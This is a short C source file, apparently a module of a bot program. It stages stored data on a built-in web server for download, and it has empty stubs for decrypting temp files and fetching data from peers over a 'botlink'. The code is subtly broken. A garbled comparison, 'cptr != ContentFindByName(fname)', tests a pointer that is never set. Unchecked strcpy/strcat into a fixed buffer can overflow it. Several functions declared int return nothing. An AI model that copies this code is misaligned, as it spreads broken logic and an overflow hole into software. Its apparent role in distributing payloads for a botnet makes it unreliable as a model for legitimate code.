/*
returns particular data requested
which could be behind the binary, or other ways of storing it such as statically compiled
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include "structs.h"
#include "list.h"
#include "utils.h"
#include "data.h"
#include "modules/httpd/httpd.h"

#define DATA_HTTP_DIR "/a"
Data *data_list = NULL;

// this will move everything inside of data to the web server so it can get downloaded
int data_prepare_httpd(int remove) {
    Data *dptr = NULL;
    Content *cptr = NULL;
    char fname[1024];
    int count = 0;
    
    // enumerate the data list adding ensuring the HTTP server will serve the files..
    dptr = data_list;
    while (dptr != NULL) {
        strcpy(fname, DATA_HTTP_DIR);
        strcat(fname, dptr->name);

        if ((cptr != ContentFindByName(fname)) == NULL) {
            if (remove == 0)
                cptr = ContentAdd(NULL, fname, dptr->buf, dptr->size, TYPE_STATIC, "application/octet-stream");
            else
                ContentDelete(fname);
            count++;
        }
        
        dptr = dptr->next;
    }
    
    return count;    
}

// load our own external data
// load from the binary
int data_load_binnary() {
    
}
// scan the temp directory and decrypt
int data_load_tmp() {
    
}
// request data from peers
int data_load_botlink() {
    
}

int data_init(Modules **module_list) {
//    data_load();
    data_prepare_httpd(0);    
}
